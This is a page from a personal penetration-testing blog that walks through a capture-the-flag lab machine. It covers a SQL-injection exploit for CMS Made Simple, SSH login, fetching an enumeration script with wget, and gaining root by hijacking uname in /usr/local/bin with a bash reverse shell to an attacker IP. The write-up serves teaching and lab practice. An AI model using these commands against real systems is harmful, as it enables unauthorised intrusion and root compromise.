<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.6">
<link rel="alternate" type="application/rss+xml" href="/Blog/blog/rss.xml" title="Penetration Testing Journal Blog RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Blog/blog/atom.xml" title="Penetration Testing Journal Blog Atom Feed"><title data-react-helmet="true">Writeup | Penetration Testing Journal</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://danae-pan.github.io/Blog/blog/Writeup"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_tag" content="default"><meta data-react-helmet="true" property="og:title" content="Writeup | Penetration Testing Journal"><meta data-react-helmet="true" name="description" content="Task 1"><meta data-react-helmet="true" property="og:description" content="Task 1"><meta data-react-helmet="true" property="og:type" content="article"><meta data-react-helmet="true" property="article:published_time" content="2025-04-11T08:48:08.194Z"><link data-react-helmet="true" rel="canonical" href="https://danae-pan.github.io/Blog/blog/Writeup"><link data-react-helmet="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/Writeup" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/Writeup" hreflang="x-default"><link rel="stylesheet" href="/Blog/assets/css/styles.8fc83261.css">
<link rel="preload" href="/Blog/assets/js/runtime~main.dcb3f7c4.js" as="script">
<link rel="preload" href="/Blog/assets/js/main.b155c943.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Blog/"><b class="navbar__title">About Me</b></a><a class="navbar__item navbar__link" href="/Blog/docs/phases/Introduction">Guides</a><a class="navbar__item navbar__link" href="/Blog/blog/Jerry">Write Ups</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Blog/docs/stories/Brain: the first computer virus">Bedtime Stories</a></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper blog-wrapper blog-post-page"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_q+wC thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_9G5K margin-bottom--md">Recent posts</div><ul class="sidebarItemList_6T4b"><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Precious">Precious</a></li><li class="sidebarItem_cjdF"><a aria-current="page" class="sidebarItemLink_zyXk sidebarItemLinkActive_wcJs" href="/Blog/blog/Writeup">Writeup</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Paper">Paper</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Devvortex">Devvortex</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Sau">Sau</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h1 class="blogPostTitle_d4p0" itemprop="headline">Writeup</h1><div class="blogPostData_-Im+ margin-vert--md"><time datetime="2025-04-11T08:48:08.194Z" itemprop="datePublished">April 11, 2025</time> · 3 min read</div></header><div class="markdown" itemprop="articleBody"><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-1"></a>Task 1<a class="hash-link" href="#task-1" title="Direct link to heading">#</a></h3><p>Submit user flag.</p><p>Opening the browser to the IP address of the target it is revealed that the web site uses DDoS protection.</p><p><img alt="alt text" src="/Blog/assets/images/image-w-2-edee0b487498a35ab805b00c27472d19.png"></p><p>Navigating to <code>/robots.txt</code> we can see that there is a path called <code>writeup/</code>. </p><p><img alt="alt text" src="/Blog/assets/images/image-w-3-fd2dfec598f7f566bc34c6788ff09209.png"></p><p>The <code>writeup/</code> path shows the following page:</p><p><img alt="alt text" src="/Blog/assets/images/image-w-4-e99f4bf3d12c749acf74390dadd83c18.png"></p><p>Running <code>whatweb</code> against the website <code>whatweb &lt;target_ip&gt;/writeup -v</code> we find the CMS to be <code>CMS Made Simple</code>.</p><p><img alt="alt text" src="/Blog/assets/images/image-w-5-ea80ef4d3ec4d054597c85373da15a6d.png"></p><p>We can then try the directories used which can be found at <code>http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/</code>. </p><p>Trying out the path <code>admin/</code> we get a pop-up to authenticate, default credentials <code>username=admin</code> and <code>password=admin</code> did not get us in.</p><p><img alt="alt text" src="/Blog/assets/images/image-w-6-309cf4b61982bcc6601ef5fd7ffc18a6.png"></p><p>Next, other directories are being tried to find the version of the CMS. At <code>doc/CHANGELOG.txt</code> we found that the version is 2.2.9.1.</p><p><img alt="alt text" src="/Blog/assets/images/image-w-7-ab253a260d6d01db60452538f318c328.png"></p><p>Using <code>searchsploit CMS Made Simple</code> we search for exploits and find versions lower than 2.2.10 are vulnerable to SQL Injection.</p><p><img alt="alt text" src="/Blog/assets/images/image-w-8-c074d0f78a42b5f2bf32d1349d5aad5e.png"></p><p>We can then copy the exploit from searchsploitby running <code>searchsploit -m php/webapps/46635.py</code> and run it by <code>python3 46635.py -u http://&lt;target_ip&gt;/writeup/ -c -w rocktou.txt</code> where the -c switch is specified to crack the detected password. The script detects the credentials which we can then use for the admin login prompt. This did not work but after trying ssh with the same credentials <code>ssh &lt;username&gt;@&lt;target_ip&gt;</code> we get in and find the user flag on the home directory of the user by <code>cat user.txt</code>.  </p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-2"></a>Task 2<a class="hash-link" href="#task-2" title="Direct link to heading">#</a></h3><p>Submit root flag.</p><p>To see if we can exploit any vulnerabilities on the target machine we run the script for Linux Enumeration. After getting the bash file on the host machine, we open a server on port 8000, on the directory we downloaded the file to, using the command<br>
<code>python3 -m http.server 8000</code></p><p>On the target machine we run<br>
<code>wget http://10.10.14.85:8000/LinEnum.sh -O /tmp/LinEnum.sh</code></p><p>After running the script, we find the user being on the staff group which allows users to add local modifications to the system (<code>/usr/local</code>) without needing root privileges. This means if root runs a script or command, and that command is resolved to your version in <code>/usr/local/bin</code>, it will run your code as root.</p><p><img alt="alt text" src="/Blog/assets/images/image-w-9-985c767c3720e2eb3c46f8351d77f770.png">  </p><p>We run the following to see which services or scripts might be impacted by <code>/usr/local/bin</code>:
<code>grep -r &quot;/usr/local/bin&quot; /etc/profile* /etc/bash.bashrc /etc/pam.d /etc/update-motd.d 2&gt;/dev/null</code>.
We confirm that <code>/usr/local/bin</code> is part of the <code>PATH</code> environment and that the update-motd system executes <code>uname</code>. Then, we verify that <code>/etc/update-motd.d/10-uname</code> indeed runs <code>uname</code>, meaning it could execute our payload if replaced:</p><p><img alt="alt text" src="/Blog/assets/images/image-w-10-5c472f014f25d9d3690f00b4ba9b9548.png"></p><p>Since <code>/usr/local/bin</code> comes first in the <code>PATH</code>, we can hijack <code>uname</code> with our own reverse shell payload.</p><p>We first start a listener on our machine:<br>
<code>nc -lvnp 4444</code></p><p>Then we overwrite <code>uname</code> with a malicious script in <code>/usr/local/bin/uname</code>:<br>
<code>echo -e &#x27;#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.85/4444 0&gt;&amp;1&#x27; &gt; /usr/local/bin/uname</code><br>
<code>chmod +x /usr/local/bin/uname</code></p><p>Now, when the system runs <code>uname</code> during SSH login, it executes our reverse shell and gives us a root shell.</p><p>Once the reverse shell connects back, we are root and we can read the root flag.
<code>cd /root</code><br>
<code>cat root.txt</code></p><p><img alt="alt text" src="/Blog/assets/images/image-w-11-7ae9c2b10a235c9a8e58d3338d2117ec.png"></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/Blog/blog/Precious"><div class="pagination-nav__sublabel">Newer Post</div><div class="pagination-nav__label">« Precious</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/Blog/blog/Paper"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">Paper »</div></a></div></nav></main><div class="col col--2"><div class="tableOfContents_vrFS thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1" class="table-of-contents__link">Task 1</a></li><li><a href="#task-2" class="table-of-contents__link">Task 2</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Contact</div><ul class="footer__items"><li class="footer__item"><a href="https://github.com/danae-pan" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://linkedin.com/in/anastasia-danai-panagiotopoulou" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"></div></div></footer></div>
<script src="/Blog/assets/js/runtime~main.dcb3f7c4.js"></script>
<script src="/Blog/assets/js/main.b155c943.js"></script>
</body>
</html>